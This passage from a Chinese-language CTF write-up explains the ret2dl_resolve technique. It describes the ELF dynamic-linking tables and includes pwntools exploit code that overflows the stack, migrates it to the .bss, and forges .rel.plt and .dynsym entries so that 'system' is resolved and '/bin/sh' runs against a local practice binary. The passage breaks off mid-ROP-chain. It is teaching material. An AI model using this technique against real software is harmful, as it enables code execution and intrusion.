    {
      Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移
      Elf32_Addr    st_value;
      Elf32_Word    st_size;
      unsigned char st_info; //对于导入函数符号而言，它是0x12
      unsigned char st_other;
      Elf32_Section st_shndx;
    }Elf32_Sym; //对于导入函数符号而言，其他字段都是0
我们所以要伪造的还有st_name，让他去我们的.dynstr表里查找，查找到我们需要的
### 第三个表就是.dynstr了，也就是ELF String Table
    LOAD:0804827C ; ELF String Table
    LOAD:0804827C byte_804827C    db 0                    ; DATA XREF: LOAD:080481EC↑o
    LOAD:0804827C                                         ; LOAD:080481FC↑o ...
    LOAD:0804827D aLibcSo6        db 'libc.so.6',0
    LOAD:08048287 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804825C↑o
    LOAD:08048296 aStdin          db 'stdin',0            ; DATA XREF: LOAD:0804826C↑o
    LOAD:0804829C aRead           db 'read',0             ; DATA XREF: LOAD:080481EC↑o
    LOAD:080482A1 aStdout         db 'stdout',0           ; DATA XREF: LOAD:0804823C↑o
    LOAD:080482A8 aStderr         db 'stderr',0           ; DATA XREF: LOAD:0804824C↑o
    LOAD:080482AF aAlarm          db 'alarm',0            ; DATA XREF: LOAD:080481FC↑o
    LOAD:080482B5 aSetvbuf        db 'setvbuf',0          ; DATA XREF: LOAD:0804822C↑o
    LOAD:080482BD aLibcStartMain  db '__libc_start_main',0
    LOAD:080482BD                                         ; DATA XREF: LOAD:0804821C↑o
    LOAD:080482CF aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:0804820C↑o
    LOAD:080482DE aGlibc20        db 'GLIBC_2.0',0
    LOAD:080482E8                 dd 20000h, 2, 2 dup(20002h), 20001h, 10001h, 1, 10h, 0
    LOAD:0804830C                 dd 0D696910h, 20000h, 62h, 0
这个没啥好解释的就是一串字符串，找到这个后，_dl_lookup就会拿这个字符串去查找对应的函数，然后将函数地址取回来写入got.plt表，最后将程序控制权交给该函数  
**注意：这里的都是相对偏移地址，没有绝对地址，切记切记，不然等会构造exp的时候你会一脸懵逼的**
## exp详解
我将exp分段进行讲述吧，从exp里调试或许能更清晰的解释这个过程
    #!/usr/bin/env python
    # coding=utf-8
    from pwn import *
    offset = 44
    elf = ELF('./pwn')
    io = process('./pwn')
    rop = ROP('./pwn')
    bss_addr = elf.bss()
    stack_size = 0x800
    base_stage = bss_addr + stack_size
    rop.raw('a'*offset)
    rop.read(0, base_stage, 100)
    rop.migrate(base_stage)
    #gdb.attach(io)
    io.sendline(rop.chain())
这段只是进行栈的迁移，这个部分的知识自行到ctf-wiki补充，或者找些题目练下
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
**这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析**  
我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section
header部分，他表里有个字段叫sh_addr
    typedef struct {
        ELF32_Word      sh_name;
        ELF32_Word      sh_type;
        ELF32_Word      sh_flags;
        ELF32_Addr      sh_addr;
        ELF32_Off       sh_offset;
        ELF32_Word      sh_size;
        ELF32_Word      sh_link;
        ELF32_Word      sh_info;
        ELF32_Word      sh_addralign;
        ELF32_Word      sh_entsize;
    } Elf32_Shdr;
成员 | 说明  
---|---  
sh_name | 节名称，是节区头字符串表节区中（Section Header String Table
Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。  
sh_type | 根据节的内容和语义进行分类，具体的类型下面会介绍。  
sh_flags | 每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。  
sh_addr | 如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。  
sh_offset | 给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset |
成员给出的是概念性的偏移。  
sh_size | 此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size
字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。  
sh_link | 此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。  
sh_info | 此成员给出附加信息，其解释依赖于节区类型。  
sh_addralign | 某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword
类型的变量，那么系统必须保证整个节区按双字对齐。也就是说，$sh_addr % sh_addralign$=0。目前它仅允许为 0，以及 2 的正整数幂数。
0 和 1 表示没有对齐约束。  
sh_entsize | 某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。  
sh_addr就是取这个地址，取进程镜像中的地址
### 接下来是重点了
  * 如果这部分不理解，你就。。。
  * 其实还是可以做这道题的，因为这是原理部分内容，完全可以复制黏贴一把梭，不用理解
  * 不过做题图个啥，不就是懂这个原理嘛，接下来仔细解释下如何构造
#### 第一部分
    fake_sym_addr = base_stage + 32
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr += align
    #对齐
接下来就是真正的构造部分了，我先构造dynsym内容的地址，我将base_stage +
32作为system函数的偏移地址，也就是说，我知道了dynstr的system地址了， **但我这随便取的base_stage + 32
有可能相对于dynsym不是个标准地址**
什么叫标准地址，他的每个结构体都是16个字节，也就是说他的地址都是对齐的，我可能相对于他不是刚好一个对齐的地址，所以我这里需要对齐一下，利用我对齐上面部分的代码就可以进行对齐了。解释下：  
假设内存布局是这样的
0x8048a00 11111111 22222222 33333333 44444444 dynsym起始位置  
0x8048a10 11111111 22222222 33333333 44444444  
0x8048a20 11111111 22222222 33333333 44444444  
0x8048a30 11111111 22222222 33333333 44444444  
0x8048a40 11111111 22222222 33333333 44444444  
0x8048a50 11111111 22222222 33333333 44444444  
0x8048a60 11111111 22222222 33333333 44444444  
0x8048a70 11111111 22222222 33333333 44444444  
0x8048a80 11111111 22222222 33333333 44444444
我base_stage + 32可能在这4个部分的任意位置，但这样是不行的，他的结构体只能从开头开始，所以我需要取他的这段开头的地址
  * 假设我在第3部分，第一个3的位置，那我base_stage + 32就是0x8048a88
  * 利用上面那个计算方式就是0x10 - ((0x8048a88 - 0x8048a00) & 0xf) = 0x10 - 0x8 = 0x8
  * 故我的地址在加上align后就变成0x8048a90刚好是对齐了
#### 第二部分
    index_dynsym = (fake_sym_addr - dynsym)/0x10
    r_info = index_dynsym << 8 | 0x7
    read_got = elf.got['setvbuf']
    fake_sys_rel = flat([read_got, r_info])
    #构造.rel.plt表
  * 然后利用这个对齐后的地址开始构造，我可以求出他在.rel.plt表中的偏移,别忘了，我当初说过的，这是相对偏移，所以我们要求r_info也是相对偏移，
  * 先通过( fake_sym_addr - dynsym(基地址) )/0x10,求出偏移
  * 然后再在这个地址后面添加上07标识，表示这个函数是导入函数，所以就变成了,左移8位就是增加一个字节，两位二进制位， |7相当于加7
  * 然后我们需要一个地址进行写入，以后调用跳到这个表的函数就会直接去到函数的真实地址了，不过这里我们只需调用一次，不需要二次调用，所以地址可以随便写，当然，要可写的地址。。。我取了setvbuf的got表，然后将他做成个结构体
  * flat([])就是将里面的全变成字符
#### 第三部分
    st_name = fake_sym_addr + 0x10 - dynstr
    fake_sys = flat([st_name, 0, 0, 0x12])
  * 构造dynsym表里的结构体，如果你不记得他具体结构是什么，往上翻一下，我们需要伪造的只有第一项跟第四项，其余为0，第一项为st_name，也就是符号的具体偏移位置，第四项标识为导入函数
  * 这里我将fake_sym_addr + 0x10作为'system\x00'的地址，然后求出相对偏移，然后将他构造成一个结构体
#### 第四部分
    index_offset = base_stage + 24 - rel_plt
这部分是最后的了，这个偏移就是拿来寻找.rel.plt表的  
构造完后，我们需要构造ROP链了
### ROP链的构造
说实话，我好几次看这个ROP链，我都被绕晕了，搞了好几次才完全理解，忘了结构体的原因，建议不要跟博主一样这样命名，结构体最后加个fake_sys_struct这样的，方便看
#### 第一部分
    rop = ROP('./pwn')
    sh = '/bin/sh'
  * 初始化ROP链和参数  
#### 第二部分
        rop.raw(plt0)
    rop.raw(index_offset)